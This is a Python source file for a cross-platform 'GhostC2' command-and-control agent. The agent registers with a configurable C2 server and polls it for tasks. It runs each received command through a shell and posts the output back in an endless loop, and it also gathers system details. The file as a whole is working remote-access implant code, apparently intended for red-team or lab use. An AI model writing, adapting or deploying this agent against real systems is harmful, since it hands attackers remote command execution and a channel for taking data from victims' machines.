#!/usr/bin/env python3
"""
GhostC2 Python Agent
A cross-platform agent for the GhostC2 C2 framework
Works on Windows, Linux, and macOS
"""

import json
import platform
import socket
import subprocess
import sys
import time
import uuid
from datetime import datetime
from urllib.parse import urljoin
import urllib.request
import urllib.error
import urllib.parse

# Configuration
SERVER_URL = "http://localhost:8080"
POLLING_INTERVAL = 15  # seconds

class GhostC2Agent:
    def __init__(self):
        self.agent_id = f"python_agent_{platform.node()}_{int(time.time())}"
        self.server_url = SERVER_URL
        self.interval = POLLING_INTERVAL
        
        # Platform detection
        self.platform = platform.system().lower()
        self.is_windows = self.platform == "windows"
        self.is_linux = self.platform == "linux"
        self.is_mac = self.platform == "darwin"
        
        # Colors for output
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'reset': '\033[0m'
        }
        
        # Disable colors on Windows
        if self.is_windows:
            self.colors = {k: '' for k in self.colors}
    
    def log(self, message, level="info"):
        """Log messages with colors"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "error":
            color = self.colors['red']
            prefix = "[!]"
        elif level == "warning":
            color = self.colors['yellow']
            prefix = "[!]"
        elif level == "success":
            color = self.colors['green']
            prefix = "[+]"
        else:
            color = self.colors['blue']
            prefix = "[*]"
        
        print(f"{color}{prefix}{self.colors['reset']} [{timestamp}] {message}")
    
    def get_system_info(self):
        """Get detailed system information"""
        info = {
            "platform": self.platform,
            "hostname": platform.node(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "python_version": sys.version,
            "username": platform.node(),
            "current_directory": subprocess.getoutput("pwd" if not self.is_windows else "cd"),
        }
        
        # Platform-specific information
        if self.is_windows:
            try:
                info["windows_version"] = platform.win32_ver()[0]
            except:
                info["windows_version"] = "Unknown"
        elif self.is_mac:
            try:
                info["macos_version"] = subprocess.getoutput("sw_vers -productVersion")
            except:
                info["macos_version"] = "Unknown"
        elif self.is_linux:
            try:
                with open("/etc/os-release", "r") as f:
                    for line in f:
                        if line.startswith("PRETTY_NAME"):
                            info["linux_distro"] = line.split("=")[1].strip().strip('"')
                            break
            except:
                info["linux_distro"] = "Unknown"
        
        return info
    
    def make_request(self, endpoint, method="GET", data=None):
        """Make HTTP request to server"""
        url = urljoin(self.server_url, endpoint)
        
        try:
            if data:
                data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=data, method=method)
                req.add_header('Content-Type', 'application/json')
            else:
                req = urllib.request.Request(url, method=method)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.read().decode('utf-8')
        except urllib.error.URLError as e:
            self.log(f"Request failed: {e}", "error")
            return None
        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
            return None
    
    def register_agent(self):
        """Register agent with the server"""
        self.log(f"Registering agent with ID: {self.agent_id}")
        
        response = self.make_request(f"/register?id={self.agent_id}")
        if response:
            self.log("Successfully registered with server", "success")
            return True
        else:
            self.log("Failed to register with server", "error")
            return False
    
    def get_command(self):
        """Get command from server"""
        response = self.make_request(f"/get-task?id={self.agent_id}")
        
        if response:
            try:
                data = json.loads(response)
                command = data.get('command', '')
                if command:
                    self.log(f"Received command: {command}")
                    return command
            except json.JSONDecodeError:
                self.log("Failed to parse server response", "error")
        
        return None
    
    def execute_command(self, command):
        """Execute command and return output"""
        self.log(f"Executing: {command}")
        
        try:
            # Use shell=True for better command execution
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30  # 30 second timeout
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\nSTDERR:\n{result.stderr}"
            
            if result.returncode != 0:
                output = f"Exit Code: {result.returncode}\n{output}"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "Error: Command timed out after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def send_result(self, output):
        """Send command result to server"""
        data = {
            "agent_id": self.agent_id,
            "output": output,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        response = self.make_request("/submit-result", method="POST", data=data)
        if response:
            self.log("Result sent successfully", "success")
        else:
            self.log("Failed to send result", "error")
    
    def check_server_connectivity(self):
        """Check if server is reachable"""
        try:
            response = self.make_request("/")
            return response is not None
        except:
            return False
    
    def run(self):
        """Main agent loop"""
        self.log("GhostC2 Python Agent Starting...")
        self.log(f"Agent ID: {self.agent_id}")
        self.log(f"Server: {self.server_url}")
        self.log(f"Platform: {self.platform}")
        self.log(f"Polling interval: {self.interval}s")
        
        # Display system information
        sys_info = self.get_system_info()
        self.log("=== System Information ===")
        for key, value in sys_info.items():
            self.log(f"{key}: {value}")
        
        # Check server connectivity
        if not self.check_server_connectivity():
            self.log("Cannot reach server. Make sure GhostC2 server is running.", "error")
            return False
        
        # Register with server
        if not self.register_agent():
            return False
        
        self.log("Starting command polling loop...")
        
        try:
            while True:
                # Get command from server
                command = self.get_command()
                
                if command:
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Send result back to server
                    self.send_result(output)
                
                # Wait before next poll
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            self.log("Agent stopped by user", "warning")
            return True
        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
            return False

def main():
    """Main entry point"""
    agent = GhostC2Agent()
    
    # Check Python version
    if sys.version_info < (3, 6):
        print("Error: Python 3.6 or higher is required")
        sys.exit(1)
    
    # Run the agent
    success = agent.run()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main() 